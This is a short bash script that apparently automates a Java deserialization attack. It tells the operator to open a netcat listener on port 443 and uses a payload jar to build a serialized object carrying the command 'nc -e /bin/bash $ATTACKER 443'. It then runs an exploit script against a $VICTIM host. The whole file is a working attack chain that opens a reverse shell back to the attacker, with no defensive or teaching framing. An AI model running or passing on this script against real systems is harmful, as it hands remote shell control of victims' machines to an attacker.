#! /bin/bash
echo
echo "*******************************************************************"
echo
echo "Open another terminal window and run a netcat listener: nc -lvp 443"
echo "Creating Payload with IP address" $ATTACKER
echo
java -jar /root/payload.jar /root/payload.ser "nc -e /bin/bash $ATTACKER 443"
echo "Payload successfully created and saved as 'payload.ser'"
echo
echo "Executing exploit..."
python3 /root/exploit.py -t $VICTIM